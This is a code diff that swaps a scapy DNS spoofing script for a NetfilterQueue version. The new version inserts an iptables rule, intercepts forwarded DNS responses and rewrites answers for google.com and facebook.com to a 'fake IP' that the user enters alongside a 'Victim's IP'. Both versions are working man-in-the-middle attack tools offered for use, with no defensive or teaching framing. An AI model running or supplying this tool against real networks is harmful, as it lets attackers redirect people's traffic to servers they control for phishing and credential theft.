@@ -1,27 +1,72 @@
-from scapy.all import *
-from dnslib import DNSRecord
+import os
+import logging as log
+from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
+from netfilterqueue import NetfilterQueue
 
-def dns_spoof(packet, target_ip, redirect_ip):
-    # Check if packet is a DNS request from the target device
-    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
-        if packet[IP].src == target_ip:  # Only spoof for the target device
-            requested_domain = packet[DNSQR].qname.decode()
+class DnsSpoof:
+    def __init__(self, hostDict, queueNum):
+        self.hostDict = hostDict
+        self.queueNum = queueNum
+        self.queue = NetfilterQueue()
 
-            print(f"[+] Spoofing {target_ip} -> {requested_domain} -> {redirect_ip}")
+    def __call__(self):
+        log.info("Starting DNS Spoofing....")
+        os.system(
+            f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
+        self.queue.bind(self.queueNum, self.callBack)
+        try:
+            self.queue.run()
+        except KeyboardInterrupt:
+            os.system(
+                f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
+            log.info("[!] iptables rule removed")
 
-            # Create a fake DNS response
-            dns_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
-                           UDP(dport=packet[UDP].sport, sport=53) / \
-                           DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
-                               an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=redirect_ip))
+    def callBack(self, packet):
+        scapyPacket = IP(packet.get_payload())
+        if scapyPacket.haslayer(DNSRR):
+            try:
+                log.info(f'[Original] {scapyPacket[DNSRR].summary()}')
+                queryName = scapyPacket[DNSQR].qname
+                if queryName in self.hostDict:
+                    scapyPacket[DNS].an = DNSRR(
+                        rrname=queryName, rdata=self.hostDict[queryName])
+                    scapyPacket[DNS].ancount = 1
 
-            send(dns_response, verbose=0)  # Send the fake response
+                    # Recalculate checksums to avoid errors
+                    del scapyPacket[IP].len
+                    del scapyPacket[IP].chksum
+                    del scapyPacket[UDP].len
+                    del scapyPacket[UDP].chksum
 
-# Ask for target IP and redirect IP
-target_ip = input("Enter the target IP address: ")
-redirect_ip = input("Enter the redirect IP address: ")
+                    log.info(f'[Modified] {scapyPacket[DNSRR].summary()}')
+                else:
+                    log.info(f'[Not Modified] {scapyPacket[DNSRR].rdata}')
+            except IndexError as error:
+                log.error(f"Error: {error}")
+            packet.set_payload(bytes(scapyPacket))
+        return packet.accept()
 
-# Start sniffing DNS packets only from the target device
-print(f"[*] Redirecting {target_ip} to {redirect_ip}")
-sniff(filter=f"udp port 53 and src host {target_ip}", prn=lambda packet: dns_spoof(packet, target_ip, redirect_ip), store=0)
 
+if __name__ == '__main__':
+    try:
+        # Ask for target and redirect IP from the user
+        target_ip = input("Enter the target IP (Victim's IP): ")
+        redirect_ip = input("Enter the redirect IP (Fake IP): ")
+
+        # Create a mapping for DNS spoofing
+        hostDict = {
+            b"google.com.": redirect_ip.encode(),  # Redirect google.com to the provided fake IP
+            b"facebook.com.": redirect_ip.encode()  # Redirect facebook.com to the provided fake IP
+        }
+
+        queueNum = 1  # Queue number for NetfilterQueue
+
+        log.basicConfig(format='%(asctime)s - %(message)s',
+                        level=log.INFO)
+        
+        # Initialize and run the DNS spoofing
+        dns_spoof = DnsSpoof(hostDict, queueNum)
+        dns_spoof()
+
+    except OSError as error:
+        log.error(f"OS Error: {error}")
